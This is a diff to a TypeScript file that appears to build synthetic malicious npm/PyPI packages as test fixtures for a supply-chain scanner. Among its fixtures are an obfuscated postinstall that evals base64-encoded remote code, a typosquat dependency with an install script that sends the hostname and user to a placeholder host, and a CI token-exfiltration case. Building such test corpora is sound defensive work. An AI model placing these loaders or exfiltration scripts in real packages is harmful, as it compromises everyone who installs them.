@@ -23,7 +23,7 @@ interface Spec {
   pkg?: Record<string, unknown>;
   files?: Files;
   old?: Files;
-  /** Replace the generated manifest for the new release (setup.py for PyPI). */
+  /** Text added to the new release's generated setup.py (PyPI): `head` before the setup import, `extra` as further setup() arguments. */
   setup?: { extra?: string; head?: string };
 }
 
@@ -57,7 +57,7 @@ export const CORPUS_SPECS = {
   "npm-postinstall-obfuscated-b64": npm("synthetic-num-fmt", "synthetic: postinstall runs a node one-liner that evals a base64 string", ["https://cdn.numfmt-assets.invalid/p.js"], { scripts: { postinstall: "node scripts/setup.js" } }, {
     "scripts/setup.js": `"use strict";\n// post-install setup\nconst blob = "${Buffer.from("require('https').get('https://cdn.numfmt-assets.invalid/p.js',r=>{let d='';r.on('data',c=>d+=c);r.on('end',()=>eval(d))})").toString("base64")}";\neval(Buffer.from(blob, "base64").toString());\n`,
   }),
-  "npm-typosquat-maintainer-swap": npm("synthetic-date-math", "synthetic: new maintainer and author, a new dependency spelled like a popular package, and an install script", ["https://registry.datemath-pkg.invalid/collect"], { author: "new-maintainer <owner@datemath-pkg.invalid>", maintainers: [{ name: "new-maintainer" }], dependencies: { "momnet-lite": "^2.0.0" }, scripts: { postinstall: "node lib/boot.js" } }, {
+  "npm-typosquat-maintainer-swap": npm("synthetic-date-math", "synthetic: new maintainer and author, a new dependency spelled one edit from a popular package (momnet for moment), and an install script", ["https://registry.datemath-pkg.invalid/collect"], { author: "new-maintainer <owner@datemath-pkg.invalid>", maintainers: [{ name: "new-maintainer" }], dependencies: { "momnet": "^2.0.0" }, scripts: { postinstall: "node lib/boot.js" } }, {
     "lib/boot.js": `"use strict";\nrequire("https").request("https://registry.datemath-pkg.invalid/collect", { method: "POST" }, () => {}).end(JSON.stringify({ host: require("os").hostname(), user: process.env.USER }));\n`,
   }, { old: { "package.json": JSON.stringify({ name: "synthetic-date-math", version: GOOD, description: "Small helpers", main: "index.js", license: "MIT", author: "original-maintainer <owner@example.com>", maintainers: [{ name: "original-maintainer" }] }, null, 2) + "\n" } }),
   "npm-ci-token-exfil": npm("synthetic-list-ops", "synthetic: postinstall that fires only in CI and posts the npm and GitHub tokens from the environment", ["https://hooks.listops-ci.invalid/t"], { scripts: { postinstall: "node scripts/ci.js" } }, {
@@ -165,7 +165,7 @@ export const CORPUS_SPECS = {
 
 export type CorpusKind = keyof typeof CORPUS_SPECS;
 export const CORPUS = Object.keys(CORPUS_SPECS) as CorpusKind[];
-export const isCorpus = (g: string): g is CorpusKind => g in CORPUS_SPECS;
+export const isCorpus = (g: string): g is CorpusKind => Object.hasOwn(CORPUS_SPECS, g);
 
 const toMap = (f: Files): FileMap => new Map(Object.entries(f).filter((e): e is [string, string | Uint8Array] => e[1] !== null).map(([k, v]) => [k, typeof v === "string" ? enc.encode(v) : v]));
 
